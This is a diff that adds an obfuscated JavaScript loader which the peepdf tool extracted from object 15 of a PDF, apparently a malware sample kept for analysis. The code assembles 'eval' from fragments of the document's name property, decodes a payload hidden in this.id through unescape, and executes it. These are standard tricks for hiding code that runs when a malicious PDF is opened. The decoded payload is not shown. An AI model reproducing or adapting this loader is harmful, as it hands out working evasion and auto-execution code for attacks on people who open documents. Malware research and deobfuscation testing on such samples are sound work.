@@ -1,0 +1,23 @@
+// peepdf comment: Javascript code located in object 15 (version 0)
+
+var jscript = this.id;
+var eqPcio = this.name;
+var fwRQNh__Trt_KQ_ = (function(_Pkz_fdUAqbgGed, _ZM) {
+    return _Pkz_fdUAqbgGed[_ZM];
+});
+var dlina = this.w;
+var chislodlina = dlina.substr(0, 2);
+var g__ddD_mJbFnp = eqPcio.substr(0, 1);
+var M__ = eqPcio.substr(13, 1);
+var KdF = fwRQNh__Trt_KQ_(this, M__ + 'v' + g__ddD_mJbFnp + 'l');
+var key = KdF(chislodlina) / 17 + 20;
+var znachok = unescape('%' + key);
+var jk = 0;
+var memory = ["1", "2"];
+for (var j = 2; j < jscript.length + 2; j += 2) {
+    memory[jk] = jscript[j - 2] + jscript[j - 1];
+    jk++
+}
+var result = znachok + memory.join(znachok);
+KdF(unescape(result));
+
